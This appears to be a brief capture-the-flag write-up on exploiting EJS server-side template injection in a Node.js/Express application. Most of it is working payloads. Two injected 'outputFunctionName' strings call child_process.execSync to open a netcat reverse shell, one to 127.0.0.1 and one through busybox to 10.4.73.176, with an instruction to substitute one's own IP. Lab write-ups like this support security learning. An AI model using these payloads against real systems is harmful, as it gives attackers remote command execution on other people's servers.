# Creating an error

<img width="1805" height="862" alt="image" src="https://github.com/user-attachments/assets/6ec7622d-a602-4aa9-9c05-4edb7fdfae00" />

# EJS SSTI exploitation

We found /home/web/app/views/settings.ejs
The file path /home/web/app/views/settings.ejs likely points to an EJS (Embedded JavaScript) template file used in a Node.js or Express.js web application.

# EJS SSTI RCE post

https://eslam.io/posts/ejs-server-side-template-injection-rce/?source=post_page-----972ee9129fe2---------------------------------------

# RCE payload
```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
```
# Command failed that's why use Busy box to get RCE

<img width="1595" height="622" alt="image" src="https://github.com/user-attachments/assets/9aa84854-c6fe-4e73-9842-25cc370f710a" />

# Busybox command

```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc -e sh 10.4.73.176 1337 -e bash');s
```

# Changing the ip address to your IP and receive it back > get RCE

